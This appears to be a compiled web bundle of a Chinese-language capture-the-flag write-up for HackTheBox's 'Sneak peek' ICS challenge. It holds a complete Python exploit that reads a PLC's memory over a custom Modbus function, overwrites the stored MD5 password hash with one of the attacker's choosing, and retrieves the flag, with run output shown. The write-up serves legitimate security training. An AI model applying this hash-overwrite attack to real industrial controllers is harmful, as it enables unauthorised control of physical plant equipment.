"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[414],{6571:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>i,default:()=>h,frontMatter:()=>o,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"HackTheBox/Challenges/Hardware/Sneak peek/index","title":"Sneak peek","description":"Difficulty: EASY","source":"@site/docs/HackTheBox/Challenges/Hardware/Sneak peek/index.md","sourceDirName":"HackTheBox/Challenges/Hardware/Sneak peek","slug":"/HackTheBox/Challenges/Hardware/Sneak peek/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Hardware/Sneak peek/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Challenges/Hardware/Sneak peek/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Photon Lockdown","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Hardware/Photon Lockdown/"},"next":{"title":"The Needle","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Hardware/The Needle/"}}');var r=t(74848),a=t(28453);const o={},i="Sneak peek",d={},c=[];function l(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",header:"header",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"sneak-peek",children:"Sneak peek"})}),"\n",(0,r.jsxs)(n.admonition,{title:"CHALLENGE DESCRIPTION",type:"note",children:[(0,r.jsx)(n.p,{children:"Difficulty: EASY"}),(0,r.jsx)(n.p,{children:"As the crew delves into their quest for acetone peroxide, they stumble upon a decrepit bread factory. Intrigued by the potential for cooperation, they approach the factory and meet the Responders faction, composed of settlers, firefighters, police officers, and medics. The Responders agree to trade acetone peroxide in exchange for the crew's help in restoring the factory to full functionality. With the PLCs in hand, the crew sets up a temporary workshop within the factory's maintenance room. The hackers and engineers collaborate to analyze the aged devices, which are layered with outdated but intricate security protocols. They hook one of the PLCs up to their portable workstation and begin the painstaking process of analyzing the custom protocol used to store the password and secret data in it. Their only lead is that the password is stored in the Memory Block of the PLC under an uncrackable MD5 hash."}),(0,r.jsx)(n.p,{children:"\u5f53\u8239\u5458\u4eec\u6df1\u5165\u5bfb\u627e\u8fc7\u6c27\u5316\u4e19\u916e\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4ed6\u4eec\u5076\u7136\u53d1\u73b0\u4e86\u4e00\u5bb6\u7834\u8d25\u7684\u9762\u5305\u5382\u3002\u51fa\u4e8e\u5bf9\u5408\u4f5c\u6f5c\u529b\u7684\u5174\u8da3\uff0c\u4ed6\u4eec\u63a5\u8fd1\u4e86\u5de5\u5382\uff0c\u5e76\u9047\u5230\u4e86\u4e00\u4e2a\u540d\u4e3a \u201c\u5e94\u6025\u54cd\u5e94\u8005\u201d \u7684\u6d3e\u7cfb\u3002\u8be5\u6d3e\u7cfb\u7531\u5b9a\u5c45\u8005\u3001\u6d88\u9632\u5458\u3001\u8b66\u5bdf\u548c\u533b\u62a4\u4eba\u5458\u7ec4\u6210\u3002\n\u5e94\u6025\u54cd\u5e94\u8005\u540c\u610f\u7528\u8fc7\u6c27\u5316\u4e19\u916e\u8fdb\u884c\u4ea4\u6613\uff0c\u6761\u4ef6\u662f\u8239\u5458\u4eec\u534f\u52a9\u5c06\u5de5\u5382\u6062\u590d\u81f3\u5168\u9762\u8fd0\u8f6c\u72b6\u6001\u3002"}),(0,r.jsx)(n.p,{children:"\u62ff\u5230\u53ef\u7f16\u7a0b\u903b\u8f91\u63a7\u5236\u5668\uff08PLC\uff09\u540e\uff0c\u8239\u5458\u4eec\u5728\u5de5\u5382\u7684\u7ef4\u62a4\u5ba4\u91cc\u642d\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u5de5\u4f5c\u574a\u3002\u9ed1\u5ba2\u548c\u5de5\u7a0b\u5e08\u4eec\u5f00\u59cb\u534f\u4f5c\uff0c\u5206\u6790\u8fd9\u4e9b\u8001\u65e7\u8bbe\u5907\uff0c\u5b83\u4eec\u5e03\u6ee1\u4e86\u8fc7\u65f6\u4f46\u590d\u6742\u7684\u5b89\u5168\u534f\u8bae\u3002\n\u4ed6\u4eec\u5c06\u5176\u4e2d\u4e00\u4e2a PLC \u8fde\u63a5\u5230\u4fbf\u643a\u5de5\u4f5c\u7ad9\uff0c\u5f00\u59cb\u8270\u96be\u5730\u5206\u6790\u7528\u4e8e\u5b58\u50a8\u5bc6\u7801\u548c\u79d8\u5bc6\u6570\u636e\u7684\u81ea\u5b9a\u4e49\u534f\u8bae\u3002\u4ed6\u4eec\u552f\u4e00\u7684\u7ebf\u7d22\u662f\uff0c\u5bc6\u7801\u5b58\u50a8\u5728 PLC \u7684\u5185\u5b58\u5757\u4e2d\uff0c\u5e76\u4f7f\u7528\u4e0d\u53ef\u7834\u89e3\u7684 MD5 \u54c8\u5e0c\u52a0\u5bc6\u3002"})]}),"\n",(0,r.jsxs)(n.p,{children:["\u9898\u76ee\u63d0\u4f9b\u4e86\u4e00\u4efd\u5ba2\u6237\u7aef\u4ee3\u7801 ",(0,r.jsx)(n.code,{children:"client.py"})," \u548c\u4e00\u4e2a\u534f\u8bae\u624b\u518c"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(69458).A+"",width:"1017",height:"1398"})}),"\n",(0,r.jsxs)(n.p,{children:["\u539f\u9898\u4e3a ",(0,r.jsx)(n.strong,{children:"Business CTF 2024 - ICS - Sneak peek"})," \u7684\u9898\u76ee"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://github.com/hackthebox/business-ctf-2024/blob/main/ics/Sneak%20peek%20%5BEasy%5D/README.md",children:"business-ctf-2024/ics/Knock Knock [Medium] at main \xb7 hackthebox/business-ctf-2024"})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# Tested on: \n# python 3.9.18 \n# pymodbus==3.5.4\n\nfrom pymodbus.client import ModbusTcpClient\nfrom pymodbus.pdu import ModbusRequest, ModbusResponse\nimport struct\nimport logging\nfrom pymodbus.transaction import ModbusSocketFramer\nimport time\nimport hashlib\n\n# Configure logging to display debug messages \n# form pymodbus library to inspect Modbus traffic\nlogging.basicConfig()\nlogging.getLogger().setLevel(logging.ERROR)\n\nHOST_IP = \'94.237.56.224\' # CHANGE IP\nHOST_PORT = 41761       # CHANGE PORT\n\nCUSTOM_FUNCTION_CODE = 0x64 # CHANGE FUNCTION CODE\nSESSION = 0x00\nERROR_CODES = {\n    0xE009: \'Authorization Error: Invalid password\'\n}\n\nREAD_MEMORY_BLOCK = 0x20\nWRITE_MEMORY_BLOCK = 0x21\nGET_SECRET = 0x22\n\n#Class templates for custom Modbus Request and Response \n# You must configure properly the classes bellow\n\nclass CustomProtocolRequest(ModbusRequest):\n    function_code = 0x64\n\n    def __init__(self, session= 0x00, code= 0, data=None, **kwargs):\n        super().__init__(**kwargs)\n        self.session = session\n        self.code = code\n        self.data = data if data is not None else []\n\n    def encode(self):\n        # Dynamically encode data based on its length and type\n        data_format = \'>BB\' + \'B\' * len(self.data)\n        return struct.pack(data_format, self.session, self.code, *self.data)\n\n    def decode(self, data):\n        """Decode a request pdu.\n        \n        Dynamically decode data based on data lenght\n\n        This function does not return data\n        """\n        print(\'[!] Request decode is not required for client!\')\n\n\nclass CustomProtocolResponse(ModbusResponse):\n    function_code = 0x64\n\n    def __init__(self, session= 0x00, code= 0x00, response_code= 0x00 , data= None, **kwargs):\n        super().__init__(**kwargs)\n        self.session = session\n        self.code = code\n        self.data = data if data is not None else []\n        self.response_status = False\n\n    def encode(self):\n        """Ecnode a response pdu.\n        \n        Dynamically encode data based on data lenght\n\n        This function returns data\n        """\n        print(\'[!] Response encode is not required for client!\')\n       \n        #return\n\n    def decode(self, data):\n        """Decode a response pdu.\n        \n        Decode a response packet where all components including session ID and custom function code are 8-bit values.\n        """\n        # Unpack the session and code first\n        self.session, self.code, self.response_status = struct.unpack(\'>BBB\', data[:3])\n        # Decode the remaining data as 8-bit unsigned integers\n        self.data = list(struct.unpack(\'>\' + \'B\' * (len(data) - 3), data[3:]))\n\n        global SESSION\n\n        SESSION = self.session\n\n\ndef send_custom_protocol_request(client, session, code, data):\n    request = CustomProtocolRequest(session=session, code=code, data=data)\n    response = client.execute(request)\n    \n    if response.function_code < 0x80:\n        #print("Successful response:", response.session, response.code, response.data)\n        return response.code, response.response_status, response.data\n    else:\n        print("Error response:", response)\n        return -1, -1, -1 \n\ndef send_packet(client, SESSION, CUSTOM_CODE, DATA=[]):\n        if client.connect():\n            print("Connected to the server")\n        \n            code, status, data = send_custom_protocol_request(client, session= SESSION, code=CUSTOM_CODE, data=DATA)  # Example with multiple data points        \n            \n            if len(data) == 2:\n                hex_number = (lambda x: (x[0] << 8) + x[1])(data)\n\n                if hex_number in ERROR_CODES:\n                    print(f\'ERROR: {ERROR_CODES[hex_number]}\')\n        else:\n            print("Failed to connect to the server")\n\n        return code, status, data\n\n\ndef increment_address(address, increment):\n    # address is a list of 3 bytes\n    address_int = (address[0] << 16) + (address[1] << 8) + address[2]\n    address_int += increment\n    return [(address_int >> 16) & 0xFF, (address_int >> 8) & 0xFF, address_int & 0xFF]\n\n\ndef split_list_at_value(input_list, split_value):\n    result = []\n    sublist = []\n\n    for item in input_list:\n        if item == split_value:\n            if sublist:\n                result.append(sublist)\n                sublist = []\n        else:\n            sublist.append(item)\n\n    if sublist:\n        # check is entry is empty memory \n        if not all(x == 0xFF for x in sublist):\n            result.append(sublist)\n\n    return result\n\ndef find_sublist_index(main_list, sublist):\n    sublist_len = len(sublist)\n    for i in range(len(main_list) - sublist_len + 1):\n        if main_list[i:i + sublist_len] == sublist:\n            return i\n    return -1\n\n\ndef string_to_list_of_ints(input_string):\n    # Convert the string to a list of integers\n    int_list = [ord(char) for char in input_string]\n    return int_list\n\ndef int_to_3_byte_list(value):\n    return [(value >> 16) & 0xFF, (value >> 8) & 0xFF, value & 0xFF]\n\n\nif __name__ == "__main__":\n    \n    client = ModbusTcpClient(HOST_IP, port=HOST_PORT, framer=ModbusSocketFramer)\n    client.framer.decoder.register(CustomProtocolResponse)\n\n    address = [0x00, 0x00, 0x00]  # Starting 3-byte address\n    read_length = 0xFF  # Number of bytes to read\n    memory_block_data = []\n\n    for i in range(0, 64): # 64 * 256 == 16 * 1024\n        data = address + [read_length]\n\n        code, status, data = send_packet(client, SESSION, READ_MEMORY_BLOCK, data)\n        \n\n        if all(byte == 0xFF for byte in data):\n            print("All bytes are 0xFF, exiting loop.")\n            break\n\n        memory_block_data += data\n        # Increment the address by read_length (0xFF)\n        address = increment_address(address, read_length)\n    \n\n    split_value = 0x00\n    memory_block_entries = split_list_at_value(memory_block_data, split_value)\n\n    hash_entry = []\n    for entry in memory_block_entries:\n        if len(entry) >= 16:\n            print(entry)\n            hash_entry += entry\n  \n\n    hash_entry_index = find_sublist_index(memory_block_data, hash_entry)\n    print(hash_entry_index)\n\n\n    passowrd = \'new_password\'\n    password_list = string_to_list_of_ints(passowrd)\n\n    # Hash the secret value using SHA-256\n    hash_object = hashlib.md5()\n    hash_object.update(passowrd.encode())  # Convert secret to bytes and hash it\n    hashed_value = hash_object.digest()  # Get the hash as bytes\n\n    # Convert hash to a list of integers\n    hashed_value_list = list(hashed_value)\n\n    for increment in range(0, 6):\n        address = int_to_3_byte_list(hash_entry_index+increment)\n        print(f\'Trying address {address}\')\n        code, status, data = send_packet(client, SESSION, 0x21, address + hashed_value_list)\n        print(code, status, data)\n\n\n        code, status, data = send_packet(client, SESSION, 0x22, password_list)\n        print(code, status, data)\n\n        if len(data) > 2:\n            print(\'Found correct hash address!\')\n\n            flag = ""\n\n            for char in data:\n                flag += chr(char)\n\n            print(\'FLAG\', flag)\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u5f97\u5230"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"$ python3 exp.py\nConnected to the server\nConnected to the server\nConnected to the server\nConnected to the server\nConnected to the server\nConnected to the server\nConnected to the server\nConnected to the server\nConnected to the server\nConnected to the server\nAll bytes are 0xFF, exiting loop.\n[63, 155, 43, 158, 110, 120, 133, 161, 6, 128, 118, 219, 218, 247, 109, 21]\n1024\nTrying address [0, 4, 0]\nConnected to the server\n33 255 [1]\nConnected to the server\n34 255 [72, 84, 66, 123, 112, 50, 48, 112, 50, 49, 51, 55, 52, 50, 121, 95, 112, 50, 48, 55, 48, 99, 48, 49, 53, 95, 55, 104, 50, 49, 118, 51, 95, 55, 104, 50, 48, 117, 57, 104, 95, 48, 56, 53, 99, 117, 50, 49, 55, 121, 95, 110, 48, 55, 95, 53, 51, 99, 117, 50, 49, 55, 121, 33, 94, 125]\nFound correct hash address!\nFLAG HTB{p20p213742y_p2070c015_7h21v3_7h20u9h_085cu217y_n07_53cu217y!^}\nTrying address [0, 4, 1]\nConnected to the server\n33 255 [1]\nConnected to the server\nERROR: Authorization Error: Invalid password\n34 240 [224, 9]\nTrying address [0, 4, 2]\nConnected to the server\n33 255 [1]\nConnected to the server\nERROR: Authorization Error: Invalid password\n34 240 [224, 9]\nTrying address [0, 4, 3]\nConnected to the server\n33 255 [1]\nConnected to the server\nERROR: Authorization Error: Invalid password\n34 240 [224, 9]\nTrying address [0, 4, 4]\nConnected to the server\n33 255 [1]\nConnected to the server\nERROR: Authorization Error: Invalid password\n34 240 [224, 9]\nTrying address [0, 4, 5]\nConnected to the server\n33 255 [1]\nConnected to the server\nERROR: Authorization Error: Invalid password\n34 240 [224, 9]\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"HTB{p20p213742y_p2070c015_7h21v3_7h20u9h_085cu217y_n07_53cu217y!^}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},69458:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250357-155701-89665b95139112d76d21dcefb3243a7f.png"},28453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>i});var s=t(96540);const r={},a=s.createContext(r);function o(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);